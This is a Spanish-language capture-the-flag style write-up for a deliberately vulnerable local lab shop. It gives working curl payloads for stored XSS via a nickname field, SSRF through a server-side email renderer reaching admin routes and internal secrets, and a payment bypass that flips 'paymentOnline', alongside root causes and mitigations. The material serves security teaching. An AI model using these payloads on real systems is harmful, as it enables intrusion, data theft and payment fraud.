# Burrito Lab

## Stored XSS, SSRF y bypass de pago

> **Spoilers:** este write-up revela las vulnerabilidades, los payloads y las soluciones completas del laboratorio.

**Burrito Lab** es una tienda de comida vulnerable construida con React y Express. La interfaz se comporta como una aplicación normal: el objetivo es descubrir los fallos inspeccionando requests, probando inputs y analizando cómo viajan los datos entre el navegador, el backend y la red interna.

> **Uso responsable:** ejecutá estas pruebas únicamente en el laboratorio local. No apuntes los payloads a servicios que no controles.

### Vulnerabilidades incluidas

| # | Vulnerabilidad | Frontera afectada | Impacto |
|---|---|---|---|
| 1 | Stored XSS | Usuario → HTML del email | Ejecución de JavaScript en el navegador |
| 2 | SSRF | HTML no confiable → renderer del servidor | Acceso a rutas administrativas y servicios internos |
| 3 | Bypass de pago | Cliente → lógica de pedidos | Confirmación de pedidos sin verificar el pago |

### Cadena principal

```text
PATCH /api/me sin validación
          ↓
Nickname malicioso almacenado
          ↓
HTML del email sin escapar
          ↓
    ┌───────────────┴────────────────┐
    ↓                                ↓
EmailPreview en navegador      Renderer del backend
    ↓                                ↓
Stored XSS                    SSRF hacia red interna
```

---

## Arquitectura

| Servicio | Responsabilidad | Acceso |
|---|---|---|
| `front/` | React + Vite. Login, menú, carrito, tracking, preview del email y panel administrativo. | `http://localhost:5173` |
| `backend/` | Express. JWT en cookie `httpOnly`, perfiles, pedidos, templates y renderer vulnerable. | `http://localhost:3000` |
| `internal-api/` | Servicio Express con secretos ficticios. | Solo desde `labnet` |

Los tres servicios comparten la red Docker `labnet`. `internal-api` no publica ningún puerto al host y únicamente puede resolverse desde otros contenedores:

```text
http://internal-api:4000
```

El navegador no puede acceder directamente a este servicio. El backend sí puede hacerlo, y esa diferencia de privilegios es lo que vuelve relevante al SSRF.

---

## Inicio rápido

### Requisito

- Docker Desktop.

### Levantar el laboratorio

```bash
docker compose up --build
```

### Accesos

| Recurso | Valor |
|---|---|
| Frontend | [http://localhost:5173](http://localhost:5173) |
| Backend | [http://localhost:3000](http://localhost:3000) |
| Usuario admin | `admin@lab.local` |
| Contraseña admin | `Admin123!` |

`internal-api` permanece inaccesible desde el host intencionalmente.

---

## Vulnerabilidad 1 — Stored XSS

### Resumen

| Campo | Detalle |
|---|---|
| Entrada | `nickname` del usuario |
| Bypass | `PATCH /api/me` no valida la longitud |
| Sink | `dangerouslySetInnerHTML` en `EmailPreview` |
| Resultado | JavaScript ejecutado al visualizar el email |

### Causa raíz

El template incorpora el nickname sin escapar:

```js
// backend/src/templates/emailTemplate.js

// Vulnerable
const nickname = user.nickname

// Corregido
const nickname = escapeHtml(user.nickname)
```

`GET /api/emails/:orderId` devuelve el HTML generado y `EmailPreview.tsx` lo inserta mediante `dangerouslySetInnerHTML`.

La aplicación intenta limitar el nickname a 20 caracteres en tres lugares:

- `maxLength` del formulario.
- `POST /api/register`.
- `PUT /api/me`.

Pero `PATCH /api/me` actualiza los mismos campos sin aplicar esa restricción.

### Explotación

1. Registrarse con un nickname válido de hasta 20 caracteres.
2. Reutilizar la cookie de sesión para actualizarlo mediante `PATCH`:

   ```bash
   curl -b cookies.txt -X PATCH http://localhost:3000/api/me \
     -H "Content-Type: application/json" \
     -d '{"nickname":"<img src=x onerror=alert(document.domain)>"}'
   ```

3. Crear un pedido nuevo. El email se genera con el nickname actual del usuario.
4. Abrir el **Preview del email de confirmación** desde el tracking.

### Resultado esperado

El navegador intenta cargar `src=x`; al fallar, ejecuta `onerror` y muestra el dominio mediante `alert`.

> Las etiquetas `<script>` insertadas mediante `innerHTML` normalmente no se ejecutan. Por eso se utilizan manejadores como `onerror` u `onload`.

### Mitigación

Activar el escape del nickname:

```yaml
ESCAPE_NICKNAME: "true"
```

Reconstruir el backend:

```bash
docker compose up -d --build backend
```

El payload ahora se representa como texto literal y deja de interpretarse como HTML.

---

## Vulnerabilidad 2 — SSRF

### Resumen

| Campo | Detalle |
|---|---|
| Entrada | URLs incluidas en el HTML del email |
| Sink | `fetch` server-side en `emailRenderer.js` |
| Privilegio abusado | Acceso del backend a loopback y `labnet` |
| Resultado | Lectura de rutas administrativas y servicios internos |

### Causa raíz

El endpoint utilizado para “exportar el email a PDF” procesa recursos encontrados en atributos `src` y `href`:

```http
POST /api/admin/emails/:orderId/render
```

`backend/src/lib/emailRenderer.js` hace `fetch` de esas URLs sin validar protocolo, host, IP resuelta ni red de destino.

El HTML controlado por el usuario se transforma así en un proxy involuntario con los privilegios de red del backend.

### Escenario A — Bypass de la ruta administrativa

`requireAdminAccess` confía en requests provenientes de loopback:

```js
export function requireAdminAccess(req, res, next) {
  if (isLoopback(req)) return next()

  requireAuth(req, res, () => requireAdmin(req, res, next))
}
```

#### Explotación

1. Actualizar el nickname del atacante:

   ```bash
   curl -b cookies.txt -X PATCH http://localhost:3000/api/me \
     -H "Content-Type: application/json" \
     -d '{"nickname":"<img src=\"http://localhost:3000/api/admin/orders\">"}'
   ```

2. Crear un pedido nuevo.
3. Iniciar sesión como administrador.
4. Exportar el email del pedido desde el panel **Admin**.

#### Resultado esperado

El reporte muestra el `bodyPreview` de:

```text
http://localhost:3000/api/admin/orders
```

La respuesta incluye pedidos y datos de usuarios. No se envía una cookie administrativa: el middleware permite la request únicamente porque proviene del propio backend.

La misma ruta consultada desde afuera continúa protegida:

```bash
curl http://localhost:3000/api/admin/orders
```

Respuesta esperada: `401 Unauthorized`.

### Escenario B — Acceso a `internal-api`

#### Explotación

1. Actualizar el nickname con una URL de la red Docker:

   ```bash
   curl -b cookies.txt -X PATCH http://localhost:3000/api/me \
     -H "Content-Type: application/json" \
     -d '{"nickname":"<img src=\"http://internal-api:4000/secrets\">"}'
   ```

2. Crear un pedido nuevo.
3. Exportar su email desde el panel administrativo.

#### Resultado esperado

El reporte muestra el contenido de:

```text
http://internal-api:4000/secrets
```

La respuesta contiene una flag, una contraseña de base de datos y credenciales ficticias.

El aislamiento puede comprobarse desde el host:

```bash
curl http://localhost:4000
```

La conexión falla porque `internal-api` no tiene un puerto publicado.

### Impacto

El mismo input produce dos impactos diferentes según quién consuma el HTML:

- En el navegador, se convierte en Stored XSS.
- En el backend, hereda acceso a loopback y a la red privada, convirtiéndose en SSRF.

### Mitigaciones

1. Escapar el input antes de interpolarlo en HTML.
2. Aplicar una allowlist estricta para recursos remotos.
3. Resolver el DNS y bloquear destinos privados, loopback y metadata:
   - `10.0.0.0/8`
   - `172.16.0.0/12`
   - `192.168.0.0/16`
   - `127.0.0.0/8`
   - `169.254.0.0/16`
4. Revalidar el destino después de cada redirección para evitar bypasses.
5. No utilizar la IP de origen como mecanismo de autenticación.

---

## Vulnerabilidad 3 — Bypass de pago

### Resumen

| Campo | Detalle |
|---|---|
| Endpoint | `POST /api/orders` |
| Dato controlado | `paymentOnline` |
| Error de diseño | El servidor confía en el estado enviado por el cliente |
| Resultado | Pedido confirmado sin pago verificado |

### Causa raíz

El servidor utiliza directamente el booleano recibido:

```js
if (paymentOnline !== false) {
  return res.status(402).json({
    error: "El pago no pudo procesarse...",
  })
}

const order = createOrder({
  userId: req.user.id,
  items,
  fulfillment: "pickup",
})
```

La interfaz siempre manda `paymentOnline: true`. Como la pasarela de prueba nunca confirma el pago, el flujo normal termina siempre en `402`.

Al recibir `false`, el backend interpreta que el pedido se pagará presencialmente y lo confirma sin realizar ninguna verificación adicional.

### Explotación

1. Agregar un producto al carrito.
2. Completar el checkout con cualquier tarjeta.
3. Confirmar y observar el error de pago.
4. Interceptar `POST /api/orders` desde DevTools, Burp Suite o mitmproxy.
5. Cambiar:

   ```json
   {
     "paymentOnline": true
   }
   ```

   por:

   ```json
   {
     "paymentOnline": false
   }
   ```

6. Reenviar la request.

También puede reproducirse con:

```bash
curl -b cookies.txt -X POST http://localhost:3000/api/orders \
  -H "Content-Type: application/json" \
  -d '{"items":[{"id":"burger","qty":1}],"paymentOnline":false}'
```

### Resultado esperado

El servidor responde `201 Created`. El tracker y el panel administrativo muestran **Retiro en el local**, aunque el pago nunca fue verificado.

### Mitigaciones

1. No aceptar desde el cliente un booleano que determine si el pedido está pagado.
2. Crear la preferencia de pago desde el backend.
3. Confirmar el pago mediante webhook firmado o consulta server-to-server.
4. Modelar estados explícitos, por ejemplo:
   - `awaiting_payment`
   - `paid`
   - `paid_at_pickup`
   - `cancelled`
5. Registrar y alertar sobre patrones anómalos de pedidos sin pago previo.

---

## Conclusión

Las tres vulnerabilidades comparten el mismo problema: **el servidor confía en datos controlados por el cliente sin aplicar validaciones consistentes**.

| Dato no confiable | Uso inseguro | Consecuencia |
|---|---|---|
| `nickname` | Interpolación directa en HTML | Stored XSS |
| URL dentro del email | `fetch` server-side sin restricciones | SSRF |
| `paymentOnline` | Decisión de negocio tomada desde el body | Bypass de pago |

Las defensas principales son claras: validación consistente, escape contextual, aislamiento de red y verificación independiente de las operaciones críticas.
